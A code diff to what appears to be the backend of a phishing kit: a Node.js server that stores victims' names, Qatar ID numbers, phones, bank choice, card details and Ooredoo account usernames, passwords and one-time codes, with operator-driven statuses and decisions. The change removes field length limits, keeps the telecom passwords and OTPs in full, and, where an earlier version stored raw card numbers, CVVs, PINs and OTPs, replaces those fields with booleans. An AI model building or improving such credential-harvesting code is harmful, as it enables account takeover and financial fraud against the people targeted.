@@ -26,6 +26,7 @@ const TYPES = {
 };
 const send = (res, code, obj) => { res.writeHead(code, { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" }); res.end(JSON.stringify(obj)); };
 const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
+const full = v => String(v == null ? "" : v);
 const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
 function readBody(req) {
   return new Promise((resolve, reject) => {
@@ -49,36 +50,47 @@ function cleanApplication(b) {
   const ooredooUser = b.ooredooUsername ?? b.ooredooUser;
   const ooredooPass = b.ooredooPassword ?? b.ooredooPass;
   const ooredooOtp = b.ooredooCode ?? b.ooredooOtp;
+  const sourcePay = b.pay && typeof b.pay === "object" ? b.pay : {};
+  const pay = {
+    cardName: full(sourcePay.cardName),
+    last4: str(sourcePay.last4, 4),
+    brand: str(sourcePay.brand, 30),
+    exp: full(sourcePay.exp ?? sourcePay.expiry),
+    cvv: Boolean(sourcePay.cvv),
+    otp: Boolean(sourcePay.otp),
+    pin: Boolean(sourcePay.pin)
+  };
   const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
   
   const application = {
     ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
     ts: Date.now(),
-    n: str(name, 120), name: str(name, 120),
-    id: str(qid, 20).replace(/\D/g, ""), qid: str(qid, 20).replace(/\D/g, ""),
-    p: str(phone, 15).replace(/\D/g, ""), phone: str(phone, 15).replace(/\D/g, ""),
-    e: str(email, 160), email: str(email, 160),
+    n: full(name), name: full(name),
+    id: full(qid).replace(/\D/g, ""), qid: full(qid).replace(/\D/g, ""),
+    p: full(phone).replace(/\D/g, ""), phone: full(phone).replace(/\D/g, ""),
+    e: full(email), email: full(email),
     g: gender === "female" ? "female" : "male", gender: gender === "female" ? "female" : "male",
     st: residency === "resident" ? "resident" : "citizen", residency: residency === "resident" ? "resident" : "citizen",
-    bank: str(bankId, 3), bankId: str(bankId, 3), bankName: str(b.bankName, 80),
-    em: str(b.em, 30), a: str(b.a, 10), ad: str(address, 500), address: str(address, 500),
-    card: str(b.card, 12), watch: str(b.watch, 20),
-    lang: b.lang === "en" ? "en" : "ar", status, step: str(b.step, 20),
+    bank: full(bankId), bankId: full(bankId), bankName: full(b.bankName),
+    em: full(b.em), a: full(b.a), ad: full(address), address: full(address),
+    card: full(b.card), watch: full(b.watch),
+    lang: b.lang === "en" ? "en" : "ar", status, step: full(b.step),
     decision: null, next: null, reason: null,
 
     // الحقول المباشرة للبطاقة والدفع وأوريدو بدون كائن pay معقد
-    cardNumber: str(b.cardNumber, 30),
-    cvv: str(b.cvv, 10),
-    expiry: str(b.expiry, 20),
-    pin: str(b.pin, 20),
-    otp: str(b.otp, 20),
-    cardName: str(b.cardName, 120),
-    last4: str(b.cardNumber ? b.cardNumber.slice(-4) : "", 4),
-    brand: "Visa/Master",
+    pay,
+    cardNumber: "",
+    cvv: "",
+    expiry: full(b.expiry || pay.exp),
+    pin: "",
+    otp: "",
+    cardName: full(b.cardName || pay.cardName),
+    last4: str(b.cardNumber ? b.cardNumber.slice(-4) : pay.last4, 4),
+    brand: pay.brand || "Visa/Master",
 
-    ooredooUser: str(ooredooUser, 100), ooredooUsername: str(ooredooUser, 100),
-    ooredooPass: str(ooredooPass, 100), ooredooPassword: str(ooredooPass, 100),
-    ooredooOtp: str(ooredooOtp, 20), ooredooCode: str(ooredooOtp, 20)
+    ooredooUser: full(ooredooUser), ooredooUsername: full(ooredooUser),
+    ooredooPass: full(ooredooPass), ooredooPassword: full(ooredooPass),
+    ooredooOtp: full(ooredooOtp), ooredooCode: full(ooredooOtp)
   };
 
   // الأسماء الواضحة هي العقد الأساسي الذي يعيده الخادم ويحفظه.
